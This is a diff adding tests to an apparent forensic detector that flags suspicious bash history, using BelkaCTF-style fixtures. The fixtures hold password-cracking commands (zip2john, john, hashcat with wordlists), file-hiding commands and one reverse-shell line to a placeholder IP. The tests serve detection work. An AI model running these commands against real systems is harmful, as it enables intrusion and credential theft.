@@ -77,6 +77,34 @@ def test_clean_history_produces_no_hits(tmp_path):
     assert lt.detect_shell_history_malicious(tmp_path) == []
 
 
+def test_concealment_tooling_detected(tmp_path):
+    """BelkaCTF Kidnapper — Ivan's bash history shows hexedit against a
+    mangled-extension PDF and zip2john against a password-protected ZIP.
+    These 'concealment' commands indicate user-side evidence hiding / manual
+    cracking, distinct from intrusion tooling."""
+    _write(tmp_path / "home" / "ivan" / ".bash_history",
+           "hexedit /home/ivan/Downloads/letter.txt\n"
+           "zip2john Monthly_DB.zip > /tmp/hash.txt\n"
+           "john --wordlist=/tmp/rockyou.txt /tmp/hash.txt\n"
+           "base32 -d payload.b32 > /tmp/raw\n"
+           "chattr +i /home/ivan/.secs\n")
+    hits = lt.detect_shell_history_malicious(tmp_path)
+    families = {h.family for h in hits}
+    assert "concealment_tooling" in families
+
+
+def test_cracker_wordlist_detected(tmp_path):
+    """The '10-million-password-list' file name appeared as a Thunderbird
+    attachment on BelkaCTF — presence alone is a strong cracker-tooling
+    signal distinct from concealment."""
+    _write(tmp_path / "home" / "ivan" / ".bash_history",
+           "cp ~/Downloads/10-million-password-list-top-1000.txt /tmp/w\n"
+           "hashcat -m 13600 /tmp/hash /tmp/w\n")
+    hits = lt.detect_shell_history_malicious(tmp_path)
+    families = {h.family for h in hits}
+    assert "cracker_tooling" in families
+
+
 def test_shell_history_returns_multiple_families_in_one_run(tmp_path):
     _write(tmp_path / "home" / "h" / ".bash_history",
            "bash -i >& /dev/tcp/1.2.3.4/9\n"
